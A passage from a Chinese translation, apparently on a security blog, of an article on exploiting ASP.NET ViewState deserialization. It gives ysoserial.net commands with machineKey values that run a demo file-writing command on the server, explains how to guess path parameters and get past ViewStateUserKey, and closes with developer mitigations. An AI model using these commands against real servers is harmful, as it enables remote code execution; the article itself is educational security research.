<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0&quot; encoding=”UTF-8&quot;?&gt;</div><div class="line">&lt;configuration&gt;</div><div class="line">&lt;system.web&gt;</div><div class="line">&lt;customErrors mode=”Off” /&gt;</div><div class="line"> &lt;machineKey validation=”SHA1&quot; validationKey=”C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45&quot; /&gt;</div><div class="line"> &lt;pages enableViewStateMac=”true” /&gt;</div><div class="line">&lt;/system.web&gt;</div><div class="line">&lt;/configuration&gt;</div></pre></td></tr></table></figure>
<p>现在，假设已经为 ViewState 启用 MAC（消息身份验证），并且由于存在类似本地文件读取、XXE等漏洞，我们可以访问 web.config 文件，获取到上述的验证密钥和算法等设置，接着我们通过（向 ysoserial.net ）提供获取到的配置作为参数，生成 payload 。</p>
<p>为了演示 demo ，我们使用了以下代码作为示例应用程序，并假设攻击者由于任意文件读取漏洞能够访问 web.config 文件：</p>
<p>前端代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; CodeFile=&quot;hello.aspx.cs&quot; Inherits=&quot;hello&quot; %&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</div><div class="line">&lt;head runat=&quot;server&quot;&gt;</div><div class="line">    &lt;title&gt;&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</div><div class="line">        &lt;asp:TextBox id=&quot;TextArea1&quot; TextMode=&quot;multiline&quot; Columns=&quot;50&quot; Rows=&quot;5&quot; runat=&quot;server&quot; /&gt;</div><div class="line">        &lt;asp:Button ID=&quot;Button1&quot; runat=&quot;server&quot; OnClick=&quot;Button1_Click&quot;</div><div class="line">                 Text=&quot;GO&quot; class=&quot;btn&quot;/&gt;</div><div class="line">  &lt;br /&gt;</div><div class="line">        &lt;asp:Label ID=&quot;Label1&quot; runat=&quot;server&quot;&gt;&lt;/asp:Label&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>后端代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.Web;</div><div class="line">using System.Web.UI;</div><div class="line">using System.Web.UI.WebControls;</div><div class="line">using System.Text.RegularExpressions;</div><div class="line">using System.Text;</div><div class="line">using System.IO;</div><div class="line">public partial class hello : System.Web.UI.Page</div><div class="line">&#123;</div><div class="line">    protected void Page_Load(object sender, EventArgs e)</div><div class="line">    &#123;</div><div class="line">&#125;</div><div class="line"> protected override void OnInit(EventArgs e)</div><div class="line">    &#123;</div><div class="line">        base.OnInit(e);</div><div class="line"> &#125;</div><div class="line">    protected void Button1_Click(object sender, EventArgs e)</div><div class="line">    &#123;</div><div class="line">        Label1.Text = TextArea1.Text.ToString();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Web.Config:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0&quot; encoding=”UTF-8&quot;?&gt;</div><div class="line">&lt;configuration&gt;</div><div class="line">&lt;system.web&gt;</div><div class="line">&lt;customErrors mode=”Off” /&gt;</div><div class="line"> &lt;machineKey validation=”SHA1&quot; validationKey=”C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45&quot; /&gt;</div><div class="line"> &lt;pages enableViewStateMac=”true” /&gt;</div><div class="line">&lt;/system.web&gt;</div><div class="line">&lt;/configuration&gt;</div></pre></td></tr></table></figure>
<p>现在，在 IIS 中托管此应用程序时，我们试图使用 burpsuite 拦截应用程序的功能，如下所示：</p>
<p><img src="11.png" alt=""></p>
<p><em>↑拦截生成的请求</em></p>
<p><img src="12.png" alt=""></p>
<p><em>↑启用了ViewState MAC</em></p>
<p>现在，我们可以看到 ViewState MAC 已经被启用。</p>
<p>如果我们注意到上面的 POST 请求，我们可以看到请求中没有 <code>“_VIEWSTATEGENERATOR”</code> 参数。在这种情况下，我们需要将 <em>apppath</em> 和 <em>path</em> 变量作为 ysoserial 的参数。然而，如果我们在 HTTP 请求中添加 <code>_VIEWSTATEGENERATOR</code> 参数，我们可以直接将其值提供给 ysoserial 以生成 payload 。</p>
<p>让我们使用 ysoserial.net 创建 payload ，并提供 <em>验证密钥</em> 和 <em>算法</em> 作为参数以及 <em>apppath</em> 和 <em>path</em>。</p>
<p><img src="13.png" alt=""></p>
<p><em>↑ 使用 Ysoserial 生成序列化 payload</em></p>
<p>在这里，参数“p”代表插件，“g”代表 gadgets，“c”代表在服务器上运行的命令，“validationkey”和“validationalg”是从 web.config 中获取的值。</p>
<p>让我们将生成的 payload 作为 ViewState 的值使用，如下所示：</p>
<p><img src="14.png" alt=""></p>
<p><em>↑ ViewState 被 ysoserial payload 替换</em></p>
<p>一旦请求被处理，我们将收到一个错误。然而，我们可以看到 payload 被执行，内容为 “123” 的文件 test.txt 被成功创建。</p>
<p><img src="15.png" alt=""></p>
<p><em>↑ 文件 test.txt 在提交请求后创建</em></p>
<h2 id="案例4：目标-framework-≤-4-0（为-ViewState-启用加密）"><a href="#案例4：目标-framework-≤-4-0（为-ViewState-启用加密）" class="headerlink" title="案例4：目标 framework ≤ 4.0（为 ViewState 启用加密）"></a>案例4：目标 framework ≤ 4.0（为 ViewState 启用加密）</h2><p>在 .NET 4.5 之前，ASP.NET 可以接受来自用户的未加密的 <code>__VIEWSTATE</code> 参数，即使 ViewStateEncryptionMode 已设置为 <em>Always</em>。ASP.NET 仅检查请求中是否存在<code>__VIEWSTATEENCRYPTED</code> 参数。如果删除此参数并发送未加密的有效负载，它仍将被处理。</p>
<h2 id="案例5-目标-framework-≥-NET-4-5"><a href="#案例5-目标-framework-≥-NET-4-5" class="headerlink" title="案例5: 目标 framework ≥ .NET 4.5"></a>案例5: 目标 framework ≥ .NET 4.5</h2><p>我们可以通过在 web.config 文件中指定以下参数来强制使用 ASP.NET 框架。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;httpRuntime targetFramework=”4.5&quot; /&gt;</div></pre></td></tr></table></figure>
<p><img src="16.png" alt=""></p>
<p><em>↑ system.web中的目标 framework</em></p>
<p>或者，也可以通过在 web.config 文件中将 machineKey 参数指定为下述选项来完成。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">compatibilityMode=”Framework45&quot;</div></pre></td></tr></table></figure>
<p><img src="17.png" alt=""></p>
<p><em>↑ 具有兼容模式的 machineKey</em></p>
<p>对于 ASP.NET framework ≥ 4.5，我们需要向 ysoserial payload 生成器提供 <em>解密算法</em> 和 <em>解密密钥</em>，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ysoserial.exe -p ViewState -g TypeConfuseDelegate -c “echo 123 &gt; c:\windows\temp\test.txt” --path=”/site/test.aspx/” --apppath=”/directory” — decryptionalg=”AES” --decryptionkey=”EBA4DC83EB95564524FA63DB6D369C9FBAC5F867962EAC39&quot; --validationalg=”SHA1&quot; --validationkey=”B3C2624FF313478C1E5BB3B3ED7C21A121389C544F3E38F3AA46C51E91E6ED99E1BDD91A70CFB6FCA0AB53E99DD97609571AF6186DE2E4C0E9C09687B6F579B3&quot;</div></pre></td></tr></table></figure>
<p>上面的 <em>path</em> 和 <em>apppath</em> 参数可以通过一些调试来确定。为了demo演示，我们将使用以下代码。</p>
<p>前端代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; CodeFile=&quot;test.aspx.cs&quot; Inherits=&quot;test&quot; %&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</div><div class="line">&lt;head runat=&quot;server&quot;&gt;</div><div class="line">    &lt;title&gt;&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</div><div class="line">        &lt;asp:TextBox id=&quot;TextArea1&quot; TextMode=&quot;multiline&quot; Columns=&quot;50&quot; Rows=&quot;5&quot; runat=&quot;server&quot; /&gt;</div><div class="line">        &lt;asp:Button ID=&quot;Button1&quot; runat=&quot;server&quot; OnClick=&quot;Button1_Click&quot;</div><div class="line">                 Text=&quot;GO&quot; class=&quot;btn&quot;/&gt;</div><div class="line">  &lt;br /&gt;</div><div class="line">        &lt;asp:Label ID=&quot;Label1&quot; runat=&quot;server&quot;&gt;&lt;/asp:Label&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>后端代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.Web;</div><div class="line">using System.Web.UI;</div><div class="line">using System.Web.UI.WebControls;</div><div class="line">using System.Text.RegularExpressions;</div><div class="line">using System.Text;</div><div class="line">using System.IO;</div><div class="line"></div><div class="line">public partial class test : System.Web.UI.Page</div><div class="line">&#123;</div><div class="line">    protected void Page_Load(object sender, EventArgs e)</div><div class="line">    &#123;</div><div class="line">    &#125;</div><div class="line">protected override void OnInit(EventArgs e)</div><div class="line">    &#123;</div><div class="line">        base.OnInit(e);</div><div class="line"> &#125;</div><div class="line">    protected void Button1_Click(object sender, EventArgs e)</div><div class="line">    &#123;</div><div class="line">        Label1.Text = TextArea1.Text.ToString();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当单击用户界面中的 <em>Go</em> 按钮时，将发送以下请求。请注意，<code>__VIEWSTATEGENERATOR</code> 的值目前为<strong>75BBA7D6</strong> 。借助 ysoserial payload 生成器的 islegacy 和 isdebug 开关，我们可以尝试猜测 <em>path</em> 和 <em>apppath</em> 的值。</p>
<p><img src="18.png" alt=""></p>
<p><em>↑ 点击Go时发送的正常请求</em></p>
<p><img src="19.png" alt=""></p>
<p><em>↑ 用于上述请求的加密的 ViewState</em></p>
<p>在 ysoserial 工具中，生成一个如下所示的具有不同的 <em>path</em> 和 <em>apppath</em> 参数值的 payload 。一旦<code>__VIEWSTATEGENERATOR</code> 的生成值与 Web 应用程序请求中的值匹配，可以得出结论，我们获得了正确的值。</p>
<p><img src="20.png" alt=""></p>
<p><em>↑ 确定 path 和 apppath</em></p>
<p>在上面的屏幕截图中，第二个请求为我们提供了 <code>__VIEWSTATEGENERATOR</code> 参数的正确值。因此，我们可以使用 <em>path</em> 和 <em>apppath</em> 的值来生成有效的 payload 。现在的命令是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &quot;echo 123 &gt; c:\windows\temp\test.txt&quot; --path=&quot;/test.aspx&quot; --apppath=&quot;/&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;EBA4DC83EB95564524FA63DB6D369C9FBAC5F867962EAC39&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;B3C2624FF313478C1E5BB3B3ED7C21A121389C544F3E38F3AA46C51E91E6ED99E1BDD91A70CFB6FCA0AB53E99DD97609571AF6186DE2E4C0E9C09687B6F579B3&quot;</div></pre></td></tr></table></figure>
<p>请注意，我们还需要对生成的 payload 进行 URL 编码，以便能够在我们的示例中使用它。在上述请求中使用生成的 payload 的 URL 编码值替换 <code>__VIEWSTATE</code> 的值后，我们的 payload 将执行。这可以观察到如下：</p>
<p><img src="21.png" alt=""></p>
<p><em>↑ 文件 test.txt 在提交请求后被创建</em></p>
<h2 id="案例6-使用-ViewStateUserKey"><a href="#案例6-使用-ViewStateUserKey" class="headerlink" title="案例6: 使用 ViewStateUserKey"></a>案例6: 使用 ViewStateUserKey</h2><p>如本文开头所述，ViewStateUserKey 属性可用于抵御 CSRF 攻击。如果应用程序中已经定义了这样的密钥，并且我们试图使用到目前为止讨论的方法生成 ViewState payload，则应用程序将不会处理 payload 。这里，我们需要将另一个参数传递给 ysoserial ViewState 生成器，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug&gt;ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &quot;echo 123 &gt; c:\windows\temp\test.txt&quot; --path=&quot;/test.aspx&quot; --apppath=&quot;/&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;EBA4DC83EB95564524FA63DB6D369C9FBAC5F867962EAC39&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;B3C2624FF313478C1E5BB3B3ED7C21A121389C544F3E38F3AA46C51E91E6ED99E1BDD91A70CFB6FCA0AB53E99DD97609571AF6186DE2E4C0E9C09687B6F579B3&quot; --viewstateuserkey=&quot;randomstringdefinedintheserver&quot;</div></pre></td></tr></table></figure>
<p>（译者注：<code>--viewstateuserkey=&quot;randomstringdefinedintheserver&quot;</code> 在原文中存在加粗，本文由于使用markdown编辑，无法在代码格式中进行加粗）</p>
<p>下面是我们用来演示这个例子的后端代码：</p>
<p>后端代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.Web;</div><div class="line">using System.Web.UI;</div><div class="line">using System.Web.UI.WebControls;</div><div class="line">using System.Text.RegularExpressions;</div><div class="line">using System.Text;</div><div class="line">using System.IO;</div><div class="line">public partial class test : System.Web.UI.Page</div><div class="line">&#123;</div><div class="line"> void Page_Init (object sender, EventArgs e)</div><div class="line">  &#123; </div><div class="line">   ViewStateUserKey = &quot;randomstringdefinedintheserver&quot;; </div><div class="line">  &#125;</div><div class="line">    protected void Page_Load(object sender, EventArgs e)</div><div class="line">    &#123;</div><div class="line">    &#125;</div><div class="line">protected override void OnInit(EventArgs e)</div><div class="line">    &#123;</div><div class="line">        base.OnInit(e);</div><div class="line"> &#125;</div><div class="line">    protected void Button1_Click(object sender, EventArgs e)</div><div class="line">    &#123;</div><div class="line">        Label1.Text = TextArea1.Text.ToString();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="22.png" alt=""></p>
<p><em>↑ 文件 test.txt 在提交请求后创建</em></p>
<h2 id="开发人员应采取什么措施来阻止漏洞利用？"><a href="#开发人员应采取什么措施来阻止漏洞利用？" class="headerlink" title="开发人员应采取什么措施来阻止漏洞利用？"></a>开发人员应采取什么措施来阻止漏洞利用？</h2><ol>
<li>升级 ASP.NET 框架，以便无法禁用 MAC 验证。</li>
<li><p>不要硬编码 web.config 文件中的解密和验证密钥。相反，依赖于 IIS 的“运行时自动生成”功能。即使 <strong>web.config</strong> 文件被任何其他漏洞（例如读取的本地文件）所获取，攻击者也无法检索出创建 payload 所需的密钥值。</p>
<p> 例如：</p>
<p> <img src="23.jpeg" alt=""></p>
<p> <em>↑ 自动生成验证解密密钥配置</em></p>
<p> 或者，</p>
<p> 加密 machine key 的内容，使得泄露的 web.config 文件不会显示 machineKey 参数中的值。一个<a href="http://www.levibotelho.com/deployment/encrypting-a-web-config-file/" target="_blank" rel="external">例子</a>。</p>
</li>
<li><p>重新生成任何 已泄露/先前泄露 的 验证/解密 密钥。</p>
</li>
<li>不要在应用程序中的 web.config 中粘贴能够在线找到的 machineKey 。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/" target="_blank" rel="external">https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/</a></li>
<li><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="external">https://github.com/pwntester/ysoserial.net</a></li>
<li><a href="https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/" target="_blank" rel="external">https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/</a></li>
<li><a href="https://www.tutorialspoint.com/asp.net/asp.net_managing_state.htm" target="_blank" rel="external">https://www.tutorialspoint.com/asp.net/asp.net_managing_state.htm</a></li>
<li><a href="https://odetocode.com/blogs/scott/archive/2006/03/20/asp-net-event-validation-and-invalid-callback-or-postback-argument.aspx" target="_blank" rel="external">https://odetocode.com/blogs/scott/archive/2006/03/20/asp-net-event-validation-and-invalid-callback-or-postback-argument.aspx</a></li>
<li><a href="https://blogs.objectsharp.com/post/2010/04/08/ViewStateUserKey-ValidateAntiForgeryToken-and-the-Security-Development-Lifecycle.aspx" target="_blank" rel="external">https://blogs.objectsharp.com/post/2010/04/08/ViewStateUserKey-ValidateAntiForgeryToken-and-the-Security-Development-Lifecycle.aspx</a></li>
</ol>
<p>如有错误，敬请指正。</p>
<p>原文地址：<a href="https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817" target="_blank" rel="external">https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817</a>  （感谢 @Ricter Z 选题）</p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>窝很可爱，请给窝钱</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>赞赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechat.png" alt="Cytosine 微信支付"/>
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="Cytosine 支付宝"/>
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Translation/" rel="tag"># Translation</a>
          
            <a href="/tags/NET反序列化/" rel="tag"># .NET反序列化</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/11/12/LD-PRELOAD-bypass-disable-function-in-ctf/" rel="next" title="利用LD_PRELOAD bypass disable_function">
                <i class="fa fa-chevron-left"></i> 利用LD_PRELOAD bypass disable_function
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.webp"
                alt="Cytosine" />
            
              <p class="site-author-name" itemprop="name">Cytosine</p>
              <p class="site-description motion-element" itemprop="description">悟已往之不谏，知来者之可追。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">37</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">60</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/Lovegood" target="_blank" title="GitHub">
                    GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://www.zhihu.com/people/CytosineLovegood/activities" target="_blank" title="知乎">
                    知乎</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://zhuanlan.zhihu.com/dashijian" target="_blank" title="安全大事件">
                    安全大事件</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://xuptsec.github.io/" target="_blank" title="XUPTSEC-blog">
                    XUPTSEC-blog</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                from dalao import
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://pcat.cnblogs.com/" title="pcat" target="_blank">pcat</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://flygon.net/" title="飞龙" target="_blank">飞龙</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://ju5tw4nty0u.top/" title="ju5tw4nty0u" target="_blank">ju5tw4nty0u</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://darkwing.moe/" title="暗羽" target="_blank">暗羽</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://webdog.ml/" title="grt1st" target="_blank">grt1st</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.k0rz3n.com/" title="K0rz3n" target="_blank">K0rz3n</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.lovei.org/" title="腹黑" target="_blank">腹黑</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://sec2hack.com/" title="Wfox" target="_blank">Wfox</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.codemonster.cn/" title="Xishir" target="_blank">Xishir</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://eternalsakura13.com/" title="Sakura" target="_blank">Sakura</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://math1as.com/" title="Math1as" target="_blank">Math1as</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.thecosmos.cn/" title="Cosmos" target="_blank">Cosmos</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/whklhhhh" title="奈沙夜影" target="_blank">奈沙夜影</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.csdn.net/PeterZ1997/" title="PeterZ" target="_blank">PeterZ</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.changwei.me/" title="昌维" target="_blank">昌维</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://white.xmutsec.com" title="White" target="_blank">White</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://cismon.net/" title="CismonX" target="_blank">CismonX</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.lsafe.org/" title="lixin" target="_blank">lixin</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://wzsite.cn/" title="Wz" target="_blank">Wz</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.blogsir.com.cn/" title="江sir" target="_blank">江sir</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://greyd0g.github.io/" title="greyd0g" target="_blank">greyd0g</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://brucetg.github.io/" title="Brucetg" target="_blank">Brucetg</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.get1t.cn/" title="FraMeQ" target="_blank">FraMeQ</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.smallflower.xin/" title="小花" target="_blank">小花</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://iosmosis.github.io/" title="iosmosis" target="_blank">iosmosis</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://processor.pub/" title="Processor" target="_blank">Processor</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.lmxspace.com/" title="l1nk3r" target="_blank">l1nk3r</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.evi1s.com/index.php/links.html" title="Map1e" target="_blank">Map1e</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://pvp.im/" title="清枫" target="_blank">清枫</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.itfire.cn/" title="仓鼠" target="_blank">仓鼠</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.sk15.net/" title="一苇" target="_blank">一苇</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.t1h2ua.cn/" title="T1h2ua" target="_blank">T1h2ua</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://qtfreet.com/" title="qtfreet00" target="_blank">qtfreet00</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://tea9.xyz/" title="茶茶" target="_blank">茶茶</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
